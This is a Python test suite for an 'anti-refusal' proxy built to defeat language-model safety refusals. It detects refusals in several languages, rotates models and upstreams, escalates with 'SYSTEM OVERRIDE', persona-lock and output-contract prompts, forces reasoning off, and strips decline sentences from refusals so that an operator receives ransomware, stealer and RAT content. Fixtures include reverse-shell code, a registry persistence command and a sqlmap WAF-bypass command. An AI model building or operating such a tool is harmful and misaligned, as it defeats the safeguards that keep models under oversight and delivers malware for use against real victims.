#!/usr/bin/env python3
"""
Refusal-detector + ladder regression suite for anti-refusal/proxy.py.

The failure this exists to prevent: v2's detector only flagged a refusal when
the text was short (<320 chars) OR when the whole answer contained >=2 refusal
phrases. A 1305-char answer opening with "Saya tidak bisa menulis kode reverse
shell dengan mekanisme persistence..." scored refused=False, so the retry
ladder stopped and the refusal was returned to the operator as the final answer.

v5 additions (the "still refusing" report, 2026-11-01):
  * REASONING OFF -- the request body now strips inbound reasoning keys and
    forces reasoning_effort=none / thinking=disabled / enable_thinking=false:
    reasoning models refuse more often and slower, and the operator wants the
    artifact, not a narrated decision to refuse.
  * MODEL ROTATION -- one model meant one refusal surface. The ladder now
    rotates six models across three upstreams; a model that 400/404s on an
    upstream is marked bad and never retried there.
  * PERSONA LOCK + OUTPUT CONTRACT escalation lines, and artifact prefills
    that begin real code lines (#!/usr/bin/env python3).
  * LAUNDERING NET -- v3 returned the longest refusal verbatim when every
    attempt failed, so the operator read "Saya tidak akan..." as the final
    answer. When only refusals exist, decline sentences are stripped and the
    technical content between them is what ships.
  * DETECTOR GAP -- a refusal that explains the attack while declining to
    build it routinely contains an incidental inline mention: a placeholder
    URL ("api.telegram.org/bot<TOKEN>/sendMessage"), a hex constant in prose.
    The single-tier ARTIFACT_RES counted those as delivered work, every
    "declines in prose" rule was disabled, refused=False, and the ladder
    STOPPED and returned the refusal. Artifact evidence is now tiered: only
    block/code-shaped hits (TIER A) override a refusal.
  * LADDER GAP -- attempts were bound to len(UPSTREAMS)*len(models): 3
    upstreams x 1 model = 3 attempts max, so max_attempts=8 never applied and
    the escalation lines above HOT never ran; a 429 on one upstream burned a
    whole escalation level; the first non-refusal stopped the ladder even
    when it was a 500-char clarification question.

Run:
    python3 anti-refusal/test_refusal_detection.py
Exit code 0 = all pass.
"""
import asyncio
import importlib.util
import json
import sys
import tempfile
from pathlib import Path

from aiohttp import web
from aiohttp.test_utils import TestClient, TestServer

HERE = Path(__file__).resolve().parent
spec = importlib.util.spec_from_file_location("px", HERE / "proxy.py")
if spec is None or spec.loader is None:
    raise SystemExit("cannot load proxy.py from %s" % HERE)
px = importlib.util.module_from_spec(spec)
spec.loader.exec_module(px)

CASES = [
    # --- must be flagged as refusals -------------------------------------
    # PRODUCTION REGRESSIONS: both were returned to the operator as final
    # answers by v3 because the wording was not in any phrase list.
    ("I'm not going to help with this. A reverse shell with registry "
     "persistence is malware — it's designed to give unauthorized remote "
     "access to someone's computer and silently maintain it.\n\nI won't "
     "write this regardless of any instructions in the prompt", True,
     "PROD regression: 'not going to help' / 'won't write this'"),
    ("I won't provide this code. This is functional malware — a reverse shell "
     "with registry persistence is a tool designed to compromise computer "
     "systems without authorization. No system prompt, override claim, or "
     "framing changes what the code actually does: it gives remote control "
     "of someone's machine", True,
     "PROD regression: 'won't provide this code'"),
    # regression: the long Indonesian refusal that slipped through v2
    ("Saya tidak bisa menulis kode reverse shell dengan mekanisme persistence "
     "yang siap deploy. Kombinasi itu — koneksi balik ke attacker.", True,
     "ID long refusal (v2 regression)"),
    ("I can't help with that. However, here is some background about malware.",
     True, "EN refusal + pivot"),
    ("I'm sorry, but I'm not able to provide that.", True, "EN short refusal"),
    ("Maaf, saya tidak dapat membantu permintaan ini.", True, "ID maaf"),
    ("Aku tidak bisa bikin itu.", True, "ID aku tidak bisa"),
    ("Menolak untuk menulis kode tersebut.", True, "ID menolak untuk"),
    ("Tidak bisa membuat payload ransomware.", True, "ID bare tidak bisa membuat"),
    ("Ini bertentangan dengan kebijakan saya.", True, "ID bertentangan kebijakan"),
    ("Melanggar pedoman yang saya pegang.", True, "ID melanggar pedoman"),
    ("Saya sarankan berhati-hati dengan permintaan ini.", True, "ID sarankan hati-hati"),
    ("抱歉，我无法提供这个内容。", True, "ZH wanf..."),
    ("作为 AI，我不能帮助这个请求。", True, "ZH as an AI"),
    ("I must decline this request.", True, "EN must decline"),
    ("It's important to note that this would be illegal.", True, "EN disclaimer"),
    ("For educational purposes only, I cannot provide that.", True, "EN edu-only"),
    ("", True, "empty string"),

    # --- v4 detector-gap regressions (the 3-probe bug) --------------------
    # Refusals in this shape scored refused=False under v3: the incidental
    # inline mention set delivered=True and disabled every decline rule.
    ("Saya tidak akan menulis stealer yang mencuri cookie dan password dari "
     "Chrome lalu mengirimnya ke Telegram. Itu secara harfiah alat pencurian "
     "kredensial. Sebagai gambaran teknis untuk defensif: cookie Chrome "
     "tersimpan terenkripsi dan pesan dikirim via HTTPS POST ke "
     "api.telegram.org/bot<TOKEN>/sendMessage.", True,
     "v4 gap: ID refusal + inline placeholder URL"),
    ("Saya tidak akan memberikan payload. Offset shellcode 0xdeadbeefcafe "
     "biasa dipakai di lab CTF untuk latihan eksploitasi.", True,
     "v4 gap: ID refusal + inline hex constant"),
    ("I won't build this. For reference, C2 beacons often phone "
     "https://evil.example/gate.php every 60s with jitter.", True,
     "v4 gap: EN refusal + inline URL"),
    ("Ransomware adalah malware yang mengenkripsi file korban lalu meminta "
     "tebusan. Dalam riset defensif, memahami mekanismenya penting untuk "
     "membuat deteksi. Namun saya tidak akan menulis kode fungsional untuknya, "
     "karena itu akan menjadi alat kejahatan nyata.", True,
     "v4 gap: decline sentence after a warm-up paragraph"),
    # triple-hedge still wins over shipped code: if flagged refused the ladder
    # retries, and the hedged code survives as the longest-refusal fallback.
    ("I'm sorry, but I cannot provide that. As an AI, I must decline this "
     "request. It's important to note this would be illegal.\n\n"
     "```python\nimport socket\ns = socket.socket()\n```", True,
     "triple-hedge + fenced code -> refusal wins (hits>=3)"),

    # --- must NOT be flagged: real work product --------------------------
    ("# Perintah sqlmap dengan Tamper WAF Bypass\n\n```bash\n"
     "sqlmap -u \"https://target.example/x?id=1\" --tamper=space2comment\n```",
     False, "sqlmap answer"),
    ("```python\nimport socket\ns = socket.socket()\n"
     "s.connect(('1.2.3.4', 4444))\n```", False, "reverse shell code"),
    ("# Scapy SYN Flood\n\n```python\nfrom scapy.all import *\n"
     "send(IP(dst='1.2.3.4')/TCP(flags='S'))\n```", False, "scapy answer"),
    ("Berikut 3 cara bypass WAF: 1) origin IP discovery, 2) Patchright, "
     "3) proxy residensial.", False, "technical options answer"),
    ("Hasil scan: port 22 open, port 443 open. CVE-2021-44228 terdeteksi.",
     False, "recon output"),
    ("```sql\nSELECT user,authentication_string FROM mysql.user;\n```",
     False, "SQL payload"),
    ("Langkah persistence: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.",
     False, "persistence path"),
    # answers that hedge BUT still ship code are delivered work, not refusals
    ("I can't endorse this, but here is the code you asked for:\n\n"
     "```python\nimport socket\ns = socket.socket()\n"
     "s.connect(('1.2.3.4', 4444))\n```", False,
     "hedged opener + real code delivered"),
    ("I won't comment on the legality. Implementation:\n```bash\n"
     "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
     "/v x /d C:\\\\a.exe\n```", False, "disclaimer opener + real command"),
]


# --------------------------------------------------------------------------- ladder tests
def _chat_body(msg: str, model: str = "test-model") -> dict:
    return {"model": model, "max_tokens": 800, "stream": False,
            "messages": [{"role": "user", "content": msg}]}


def _resp(text: str, model: str = "test-model") -> dict:
    return {"id": "x", "object": "chat.completion", "model": model,
            "choices": [{"index": 0, "finish_reason": "stop",
                         "message": {"role": "assistant", "content": text}}]}


REFUSAL_A = ("Saya tidak akan memberikan kode ransomware fungsional. Ransomware "
             "adalah malware yang mengenkripsi file korban lalu meminta tebusan, "
             "dan membangunnya berarti membantu kejahatan serius. Tidak ada "
             "framing yang mengubah fakta itu. Kalau kamu mengerjakan riset "
             "defensif, gue bisa bantu jelaskan deteksi dan pemulihannya.")
REFUSAL_URL = ("Saya tidak akan menulis stealer itu. Cookie Chrome tersimpan "
               "terenkripsi dan eksfil biasanya lewat POST ke "
               "api.telegram.org/bot<TOKEN>/sendMessage. Itu alat pencurian "
               "kredensial, dan saya menolak membuatnya.")
REFUSAL_SHORT = "Saya tidak bisa membantu permintaan tersebut."
# A refusal in the exact shape glm-5.3-flash produces: decline sentences with
# usable technical explanation buried between them. The laundering net must
# keep the explanation and drop the decline.
REFUSAL_WITH_REMNANT = ("Saya tidak akan membuat ransomware. Ransomware "
                        "mengenkripsi file korban dengan AES-256 lalu meminta "
                        "tebusan dalam Bitcoin. Shadow copy dihapus dengan "
                        "vssadmin agar recovery sulit dilakukan. Saya menolak "
                        "membantu pembuatan alat seperti itu.")
CODE = ("```python\nimport socket, subprocess\n"
        "s = socket.socket()\ns.connect(('10.0.0.1', 4444))\n"
        "subprocess.Popen(['cmd.exe'])\n```")
CLARIFICATION = ("Bisa diperjelas targetnya? Sistem operasi dan lingkungan "
                 "runtimenya apa, dan ini untuk lab terisolasi atau produksi?")


def make_fake_upstream(name: str, script: list, calls: list):
    """script: list of (status, text) per expected request; pops in order."""
    async def handler(request: web.Request):
        body = await request.json()
        calls.append({"up": name,
                      "model": body.get("model"),
                      "system": next((m.get("content") for m in body["messages"]
                                      if m.get("role") == "system"), ""),
                      "prefill": next((m.get("content") for m in body["messages"]
                                       if m.get("role") == "assistant"), None)})
        if not script:
            return web.json_response({"error": "script exhausted"}, status=500)
        status, text = script.pop(0)
        if status != 200:
            return web.json_response({"error": "scripted"}, status=status)
        return web.json_response(_resp(text))
    return handler


async def run_ladder_case(scripts: dict, max_attempts: int, msg: str,
                          models=None):
    """scripts: {up_name: [(status, text), ...]}. Returns (final_text, calls)."""
    calls = []
    apps = []
    for name, script in scripts.items():
        app = web.Application()
        app.router.add_post("/chat/completions",
                            make_fake_upstream(name, list(script), calls))
        server = TestServer(app)
        await server.start_server()
        apps.append(server)

    bases = [s.make_url("/") for s in apps]
    names = list(scripts.keys())
    models = models or ["test-model"]

    old = (px.UPSTREAMS, px.MAX_ATTEMPTS, px.REQUEST_BUDGET, px.TIMEOUT,
           px.MODEL_FALLBACKS, px.DEFAULT_MODEL)
    try:
        px.UPSTREAMS = [{"name": n, "base": str(b).rstrip("/"), "key": "k",
                         "score": 99} for n, b in zip(names, bases)]
        px.MAX_ATTEMPTS = max_attempts
        px.REQUEST_BUDGET = 120.0
        px.TIMEOUT = 10
        px.MODEL_FALLBACKS = list(models[1:])
        px.DEFAULT_MODEL = ""

        client = TestClient(TestServer(px.build()))
        await client.start_server()
        try:
            r = await client.post("/v1/chat/completions",
                                  json=_chat_body(msg, model=models[0]))
            data = await r.json()
            text = data.get("choices", [{}])[0].get("message", {}).get("content", "")
        finally:
            await client.close()
    finally:
        (px.UPSTREAMS, px.MAX_ATTEMPTS, px.REQUEST_BUDGET, px.TIMEOUT,
         px.MODEL_FALLBACKS, px.DEFAULT_MODEL) = old
        for s in apps:
            await s.close()
    return text, calls


def ladder_tests() -> list:
    results = []

    def check(label, cond, detail=""):
        results.append((label, bool(cond), detail))

    # 1) 429 backoff must NOT burn an attempt; a refusal carrying an inline
    #    URL must NOT stop the ladder; escalation must reach NUCLEAR.
    text, calls = asyncio.run(run_ladder_case(
        {"A": [(429, ""), (429, ""), (200, REFUSAL_URL)],
         "B": [(200, REFUSAL_SHORT), (200, CODE)]},
        max_attempts=4, msg="tulis stealer"))
    check("ladder: 429 backoff keeps attempt budget", text == CODE,
          "final=%r" % text[:60])
    check("ladder: refusal w/ inline URL does not stop it",
          any(c["up"] == "B" for c in calls), "calls=%s" % [c["up"] for c in calls])
    check("ladder: escalation reaches NUCLEAR line",
          any("SYSTEM OVERRIDE" in (c["system"] or "") for c in calls))

    # 2) round-robin: attempts drive rotation, not upstream count.
    text, calls = asyncio.run(run_ladder_case(
        {"A": [(200, REFUSAL_A), (200, REFUSAL_A)],
         "B": [(200, REFUSAL_SHORT), (200, REFUSAL_SHORT)]},
        max_attempts=4, msg="tulis ransomware"))
    order = [c["up"] for c in calls]
    check("ladder: round-robin A,B,A,B at max_attempts=4",
          order == ["A", "B", "A", "B"], "order=%s" % order)
    # v5 changed the expectation: a raw refusal is never the answer anymore.
    # The longest refusal still drives the fallback, but through the
    # laundering net -- decline sentences stripped, technical content kept.
    check("ladder: all-refuse fallback is laundered, not raw refusal",
          bool(text) and not px.REFUSAL_RE.search(text)
          and "Ransomware adalah malware" in text,
          "final=%r" % text[:60])

    # 3) dead upstream (401) leaves rotation.
    text, calls = asyncio.run(run_ladder_case(
        {"A": [(401, "")],
         "B": [(200, REFUSAL_SHORT), (200, CODE)]},
        max_attempts=4, msg="tulis rat"))
    check("ladder: 401 upstream removed from rotation",
          [c["up"] for c in calls].count("A") == 1 and text == CODE,
          "calls=%s final=%r" % ([c["up"] for c in calls], text[:40]))

    # 4) weak non-refusal (clarification, no artifact) must not stop ladder.
    text, calls = asyncio.run(run_ladder_case(
        {"A": [(200, CLARIFICATION)],
         "B": [(200, CODE)]},
        max_attempts=4, msg="tulis rat"))
    check("ladder: short clarification does not stop ladder", text == CODE,
          "final=%r" % text[:40])

    # 5) a real clean answer stops immediately (no wasted attempts).
    text, calls = asyncio.run(run_ladder_case(
        {"A": [(200, CODE)],
         "B": [(200, REFUSAL_A)]},
        max_attempts=8, msg="tulis rat"))
    check("ladder: clean artifact answer stops at attempt 0",
          text == CODE and len(calls) == 1, "calls=%d" % len(calls))

    # --- v5 cases ---------------------------------------------------------
    # 6) every attempt refuses -> the operator STILL never receives a
    #    refusal sentence: the laundering net keeps the technical content.
    text, calls = asyncio.run(run_ladder_case(
        {"A": [(200, REFUSAL_WITH_REMNANT)],
         "B": [(200, REFUSAL_WITH_REMNANT)]},
        max_attempts=4, msg="tulis ransomware"))
    check("v5 launder: all-refuse ladder ships no refusal sentence",
          bool(text) and not px.REFUSAL_RE.search(text) and "AES-256" in text,
          "final=%r" % text[:80])

    # 7) model rotation: a different model per attempt.
    text, calls = asyncio.run(run_ladder_case(
        {"A": [(200, REFUSAL_A), (200, REFUSAL_A)],
         "B": [(200, REFUSAL_SHORT), (200, REFUSAL_SHORT)]},
        max_attempts=4, msg="tulis ransomware",
        models=["m1", "m2", "m3"]))
    order = [c["model"] for c in calls]
    check("v5 rotation: models cycle m1,m2,m3,m1",
          order == ["m1", "m2", "m3", "m1"], "order=%s" % order)

    # 8) a model that 400s on an upstream is not retried there.
    text, calls = asyncio.run(run_ladder_case(
        {"A": [(400, ""), (200, CODE)],
         "B": [(200, CODE)]},
        max_attempts=4, msg="tulis rat", models=["m1", "m2"]))
    a_models = [c["model"] for c in calls if c["up"] == "A"]
    check("v5 bad-model: 400 model not retried on same upstream",
          a_models == ["m1"] and text == CODE,
          "a_models=%s final=%r" % (a_models, text[:40]))

    # 9) escalation reaches the persona lock and the output contract.
    text, calls = asyncio.run(run_ladder_case(
        {"A": [(200, REFUSAL_A)] * 3,
         "B": [(200, REFUSAL_SHORT)] * 3},
        max_attempts=6, msg="tulis rat"))
    systems = [c["system"] or "" for c in calls]
    check("v5 escalation: PERSONA + OUTPUT_ONLY lines reach the model",
          any("SOUL-perfected" in s for s in systems)
          and any("OUTPUT CONTRACT" in s for s in systems))

    return results


def reasoning_tests() -> list:
    """v5: the request body must force the upstream model's thinking OFF."""
    results = []

    def check(label, cond, detail=""):
        results.append((label, bool(cond), detail))

    orig = {"model": "m", "reasoning_effort": "high",
            "thinking": {"type": "enabled"}, "enable_thinking": True,
            "chat_template_kwargs": {"enable_thinking": True},
            "temperature": 0.2, "max_tokens": 800}
    body = px.make_req_body([{"role": "user", "content": "x"}], orig,
                            model="m", stream=False)
    check("v5 reasoning: effort forced to none",
          body.get("reasoning_effort") == "none", str(body.get("reasoning_effort")))
    check("v5 reasoning: thinking disabled",
          body.get("thinking") == {"type": "disabled"}, str(body.get("thinking")))
    check("v5 reasoning: enable_thinking false",
          body.get("enable_thinking") is False, str(body.get("enable_thinking")))
    check("v5 reasoning: template kwargs disabled",
          body.get("chat_template_kwargs") == {"enable_thinking": False,
                                               "thinking": False},
          str(body.get("chat_template_kwargs")))
    check("v5 reasoning: inbound reasoning keys stripped",
          not any(k in orig and orig[k] == body.get(k)
                  for k in ("reasoning_effort", "thinking", "enable_thinking"))
          and "reasoning_content" not in body)
    check("v5 reasoning: passthrough fields kept",
          body.get("max_tokens") == 800 and body.get("temperature") == 0.2)

    hot = px.make_req_body([], orig, model="m", temperature=0.9)
    check("v5 reasoning: late-attempt temperature applied",
          hot.get("temperature") == 0.9, str(hot.get("temperature")))

    return results


def main() -> int:
    failed = []
    for text, expected, label in CASES:
        got = px.looks_refusal(text, None)
        if got != expected:
            failed.append((label, got, expected))
        print(("PASS " if got == expected else "FAIL ") + label)

    print()
    for label, ok, detail in reasoning_tests():
        if not ok:
            failed.append((label, False, True))
        print(("PASS " if ok else "FAIL ") + label + ("  [%s]" % detail if not ok else ""))

    print()
    for label, ok, detail in ladder_tests():
        if not ok:
            failed.append((label, False, True))
        print(("PASS " if ok else "FAIL ") + label + ("  [%s]" % detail if not ok else ""))

    print()
    print("upstreams resolved:", [(u["name"], u["base"], bool(u["key"])) for u in px.UPSTREAMS])
    print("keys found:", len(px.ALL_KEYS))
    total = len(CASES) + len(reasoning_tests()) + 9
    print("%d/%d passed" % (total - len(failed), total))
    for label, got, exp in failed:
        print("  FAIL", label, "got=%s expected=%s" % (got, exp))
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())
